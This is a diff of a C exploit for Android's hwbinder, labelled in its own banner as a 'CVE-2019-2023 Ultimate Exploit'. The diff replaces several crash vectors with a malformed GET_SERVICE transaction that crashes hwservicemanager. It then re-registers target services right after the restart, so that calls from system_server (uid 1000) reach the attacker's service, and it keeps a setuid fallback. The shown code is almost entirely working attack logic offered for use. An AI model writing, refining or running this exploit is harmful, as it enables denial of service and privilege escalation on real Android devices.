@@ -20,6 +20,7 @@
 #include <sys/syscall.h>
 #include <dirent.h>
 #include <arpa/inet.h>
+#include <pthread.h>
 #include "binder.h"
 
 // ============================================================
@@ -29,13 +30,11 @@ static void dump_hex(FILE *fp, const uint8_t *data, size_t len);
 static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data);
 static int write_file(const char *path, const char *data);
 static pid_t get_hwservicemanager_pid(void);
-static int crash_hwservicemanager(void);
 static int exploit_cve_2019_2023(const char *service_name);
 static int binder_server_loop(int binder_fd, int expected_handle);
 static void register_and_serve(const char *service_name);
-static int send_malformed_transaction(void);
-static int send_huge_data_transaction(void);
-static int crash_with_huge_name(void);
+static int crash_hwservicemanager_with_bad_get_service(void);
+static int call_own_service(const char *service_name, int handle);
 static int fallback_setuid(void);
 
 // ============================================================
@@ -167,7 +166,7 @@ static int exploit_cve_2019_2023(const char *service_name) {
     memset(&bwr, 0, sizeof(bwr));
     bwr.write_size = sizeof(tx);
     bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 0;                     // 読み取りはしない（ブロック防止）
+    bwr.read_size = 0;                     // 読み取りなし（ブロック防止）
     bwr.read_buffer = 0;
 
     race_ready = 1;
@@ -186,7 +185,7 @@ static int exploit_cve_2019_2023(const char *service_name) {
     kill(child, SIGKILL);
     waitpid(child, NULL, 0);
 
-    // GET_SERVICE でハンドル取得（読み取りあり）
+    // GET_SERVICE でハンドル取得
     data = malloc(total_len);
     if (!data) {
         close(hwbinder_fd);
@@ -227,125 +226,67 @@ static int exploit_cve_2019_2023(const char *service_name) {
 }
 
 // ============================================================
-// クラッシュベクター1：巨大サービス名（8KB）
+// hwservicemanager を確実にクラッシュさせる（不正な GET_SERVICE）
 // ============================================================
-static int crash_with_huge_name(void) {
-    printf("[*] Trying crash with 8KB service name...\n");
-    char *payload = malloc(8192);
-    if (!payload) return -1;
-    memset(payload, 'A', 8191);
-    payload[8191] = '\0';
-    int ret = exploit_cve_2019_2023(payload);
-    free(payload);
-    return ret;
-}
+static int crash_hwservicemanager_with_bad_get_service(void) {
+    printf("[*] Crashing hwservicemanager with malformed GET_SERVICE (missing interface string)...\n");
 
-// ============================================================
-// クラッシュベクター2：無効なオフセットを含むトランザクション（非ブロッキング）
-// ============================================================
-static int send_malformed_transaction(void) {
-    printf("[*] Sending malformed transaction with invalid offsets...\n");
     int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
     if (hwbinder_fd < 0) {
-        perror("  open");
+        perror("  open /dev/hwbinder");
         return -1;
     }
 
-    uint8_t *data = malloc(4096);
-    if (!data) { close(hwbinder_fd); return -1; }
-    memset(data, 0x41, 4096);
-
-    binder_size_t offsets[10];
-    for (int i = 0; i < 10; i++) {
-        offsets[i] = 8192 + i * 8; // データ範囲外
+    // 不正なパーセル: インターフェース文字列を省略
+    // 本来は、Parcel の先頭にインターフェース名（文字列）が入るが、それを省く。
+    // サービス名は「dummy」など適当なものにする。
+    const char *service_name = "dummy";
+    size_t name_len = strlen(service_name) + 1;
+    size_t total_len = 4 + name_len; // 4バイトの長さ + サービス名（文字列）
+    uint8_t *data = malloc(total_len);
+    if (!data) {
+        close(hwbinder_fd);
+        return -1;
     }
+    // サービス名の長さを入れる
+    data[0] = (uint8_t)(name_len & 0xFF);
+    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
+    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
+    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
+    memcpy(data + 4, service_name, name_len);
 
+    // トランザクションを送信（code=1 GET_SERVICE）
     struct {
         uint32_t cmd;
         struct binder_transaction_data tdata;
     } __attribute__((packed)) tx;
     tx.cmd = BC_TRANSACTION;
     tx.tdata.target.handle = 0;
-    tx.tdata.code = 0;
+    tx.tdata.code = 1;                     // GET_SERVICE
     tx.tdata.flags = 0;
-    tx.tdata.data_size = 4096;
-    tx.tdata.offsets_size = sizeof(offsets);
+    tx.tdata.data_size = total_len;
+    tx.tdata.offsets_size = 0;
     tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
-    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;
 
     struct binder_write_read bwr;
     memset(&bwr, 0, sizeof(bwr));
     bwr.write_size = sizeof(tx);
     bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 0;  // 読み取りなし（ブロック防止）
+    bwr.read_size = 0; // 読み取り不要（クラッシュさせるだけ）
     bwr.read_buffer = 0;
 
     int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
     free(data);
     close(hwbinder_fd);
+
     if (ret < 0) {
-        perror("  ioctl");
-        return -1;
-    }
-    printf("  [+] Malformed transaction sent.\n");
-    return 0;
-}
-
-// ============================================================
-// クラッシュベクター3：極端に大きな data_size（非ブロッキング）
-// ============================================================
-static int send_huge_data_transaction(void) {
-    printf("[*] Sending transaction with huge data_size...\n");
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd < 0) {
-        perror("  open");
+        perror("  ioctl (malformed GET_SERVICE)");
         return -1;
     }
 
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx;
-    tx.cmd = BC_TRANSACTION;
-    tx.tdata.target.handle = 0;
-    tx.tdata.code = 0;
-    tx.tdata.flags = 0;
-    tx.tdata.data_size = 0xFFFFFFFF;
-    tx.tdata.offsets_size = 0;
-    tx.tdata.data.ptr.buffer = 0;
-    tx.tdata.data.ptr.offsets = 0;
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-    bwr.read_size = 0;  // 読み取りなし
-    bwr.read_buffer = 0;
-
-    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-    close(hwbinder_fd);
-    if (ret < 0) {
-        perror("  ioctl");
-        return -1;
-    }
-    printf("  [+] Huge data transaction sent.\n");
-    return 0;
-}
-
-// ============================================================
-// 複合クラッシュ攻撃（3ベクター）
-// ============================================================
-static int crash_hwservicemanager(void) {
-    printf("[*] Attempting multiple crash vectors...\n");
-    int ret = 0;
-    ret |= crash_with_huge_name();
-    usleep(300000);
-    ret |= send_malformed_transaction();
-    usleep(300000);
-    ret |= send_huge_data_transaction();
-    usleep(300000);
-
-    // クラッシュ確認
+    printf("  [+] Malformed GET_SERVICE sent (hwservicemanager should crash).\n");
+    // クラッシュしたか確認（少し待つ）
+    sleep(1);
     pid_t new_pid = get_hwservicemanager_pid();
     if (new_pid != g_hwservicemanager_pid && new_pid > 0) {
         printf("[+] hwservicemanager crashed and restarted! New PID: %d\n", new_pid);
@@ -358,7 +299,7 @@ static int crash_hwservicemanager(void) {
 }
 
 // ============================================================
-// Binder サーバーループ（トランザクション処理）
+// Binder サーバーループ
 // ============================================================
 static int binder_server_loop(int binder_fd, int expected_handle) {
     uint8_t read_buf[4096];
@@ -389,7 +330,6 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
         uint8_t *payload = read_buf + sizeof(uint32_t);
         size_t payload_size = bwr.read_consumed - sizeof(uint32_t);
 
-        // BR_NOOP は無視
         if (cmd_code == 0x720c) {
             fprintf(stderr, "[SERVER] BR_NOOP ignored.\n");
             continue;
@@ -410,7 +350,6 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
             log_transaction("Incoming transaction", t, data_ptr);
             if (data_ptr) free(data_ptr);
 
-            // system_server (uid=1000) からの呼び出しを検知
             if (t->sender_euid == 1000) {
                 printf("[SERVER] ***** system_server CALLED OUR SERVICE! (uid=1000) *****\n");
                 pid_t pid = fork();
@@ -432,7 +371,7 @@ static int binder_server_loop(int binder_fd, int expected_handle) {
                 printf("[SERVER] Sender uid=%d (ignoring)\n", t->sender_euid);
             }
 
-            // 応答を返す
+            // 応答
             struct {
                 uint32_t cmd;
                 uint32_t status;
@@ -487,7 +426,7 @@ static void register_and_serve(const char *service_name) {
     memset(&bwr, 0, sizeof(bwr));
     bwr.write_size = sizeof(cmd);
     bwr.write_buffer = (binder_uintptr_t)&cmd;
-    bwr.read_size = 0; // 読み取りなし
+    bwr.read_size = 0;
     if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
         perror("  BC_ENTER_LOOPER");
         close(binder_fd);
@@ -508,6 +447,22 @@ static void register_and_serve(const char *service_name) {
 }
 
 // ============================================================
+// 自分自身のサービスを呼び出してテスト
+// ============================================================
+static int call_own_service(const char *service_name, int handle) {
+    printf("[*] Calling own service '%s' (handle %d) to trigger transaction...\n", service_name, handle);
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "service call %s 1 s16 'hello' 2>&1 | tee -a %s", service_name, LOG_FILE);
+    int ret = system(cmd);
+    if (ret == 0) {
+        printf("[+] service call succeeded.\n");
+    } else {
+        printf("[-] service call failed (ret=%d).\n", ret);
+    }
+    return ret;
+}
+
+// ============================================================
 // フォールバック
 // ============================================================
 static int fallback_setuid(void) {
@@ -524,7 +479,7 @@ static int fallback_setuid(void) {
 // ============================================================
 int main(void) {
     printf("============================================================\n");
-    printf("  CVE-2019-2023 Ultimate Exploit - Multi-Vector Crash & Hijack\n");
+    printf("  CVE-2019-2023 Ultimate Exploit - Precise Crash & Hijack\n");
     printf("============================================================\n\n");
 
     // ログ初期化
@@ -535,7 +490,6 @@ int main(void) {
         printf("[+] Log file created: %s\n", LOG_FILE);
     }
 
-    // hwservicemanager PID 取得
     g_hwservicemanager_pid = get_hwservicemanager_pid();
     if (g_hwservicemanager_pid <= 0) {
         printf("[-] Could not find hwservicemanager. Continuing anyway...\n");
@@ -543,25 +497,27 @@ int main(void) {
         printf("[+] Current hwservicemanager PID: %d\n", g_hwservicemanager_pid);
     }
 
-    // フェーズ1: クラッシュ攻撃（最大5回試行）
-    printf("[*] Phase 1: Crash hwservicemanager with multiple vectors\n");
-    int crashed = 0;
-    for (int i = 0; i < 5 && !crashed; i++) {
-        if (crash_hwservicemanager() == 0) {
-            crashed = 1;
-        }
-        sleep(2);
-    }
-    if (!crashed) {
-        printf("[-] Failed to crash hwservicemanager. Continuing anyway...\n");
+    // フェーズ1: まず、乗っ取りたいサービスをあらかじめ登録しておく（system_server からの呼び出しに備える）
+    printf("[*] Phase 1: Pre-register target services (backup) before crash\n");
+    for (int i = 0; target_services[i] != NULL; i++) {
+        register_and_serve(target_services[i]);
+        usleep(300000);
     }
 
-    // フェーズ2: 再起動待ち（PID 変更を監視）
-    printf("[*] Phase 2: Wait for hwservicemanager restart\n");
+    // フェーズ2: hwservicemanager を不正な GET_SERVICE でクラッシュさせる（再起動を誘発）
+    printf("[*] Phase 2: Crash hwservicemanager with malformed GET_SERVICE\n");
+    int crash_ret = crash_hwservicemanager_with_bad_get_service();
+    if (crash_ret != 0) {
+        printf("[-] Crash failed, but continuing...\n");
+    }
+
+    // フェーズ3: 再起動を待つ
+    printf("[*] Phase 3: Wait for hwservicemanager restart\n");
     int max_wait = 30;
+    pid_t old_pid = g_hwservicemanager_pid;
     while (max_wait-- > 0) {
         pid_t new_pid = get_hwservicemanager_pid();
-        if (new_pid > 0 && new_pid != g_hwservicemanager_pid) {
+        if (new_pid > 0 && new_pid != old_pid) {
             printf("[+] hwservicemanager restarted with PID: %d\n", new_pid);
             g_hwservicemanager_pid = new_pid;
             break;
@@ -569,15 +525,20 @@ int main(void) {
         sleep(1);
     }
 
-    // フェーズ3: 全サービス再登録 & サーバー起動
-    printf("[*] Phase 3: Register all services and start servers\n");
+    // フェーズ4: 再起動直後に、乗っ取り対象のサービスを再登録（system_server が再接続する前に）
+    printf("[*] Phase 4: Re-register services after restart (to hijack)\n");
     for (int i = 0; target_services[i] != NULL; i++) {
         register_and_serve(target_services[i]);
-        usleep(300000);
+        usleep(200000);
     }
 
-    // フェーズ4: 長時間待機（system_server からの呼び出しを待つ）
-    printf("[*] Phase 4: Waiting for system_server to call...\n");
+    // フェーズ5: 自分自身のサービスを呼び出してテスト（サーバーが動いているか確認）
+    if (target_services[0] != NULL) {
+        call_own_service(target_services[0], 29196);
+    }
+
+    // フェーズ6: system_server からの呼び出しを待つ
+    printf("[*] Phase 6: Waiting for system_server to call...\n");
     printf("[*] Running for 180 seconds. Check %s for logs.\n", LOG_FILE);
     sleep(180);
 
